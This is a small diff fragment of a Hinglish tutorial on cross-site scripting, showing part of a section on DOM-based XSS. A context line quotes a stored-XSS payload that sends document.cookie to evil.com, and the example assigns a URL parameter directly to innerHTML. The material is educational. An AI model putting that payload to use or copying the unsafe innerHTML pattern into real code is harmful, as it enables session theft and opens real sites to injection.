@@ -33,7 +33,6 @@ User ne comment mein `<script>fetch('https://evil.com?c='+document.cookie)</scri
 ## 3. DOM‑Based XSS  
 - **Description:** Pure client-side hota hai. JavaScript DOM methods (e.g., `innerHTML`) user input ko unsafe tarike se content me inject kar dete hain.  
 - **Example:**  
-```js
          const name = new URLSearchParams(window.location.search).get('name');
            document.getElementById('greet').innerHTML = name;
 
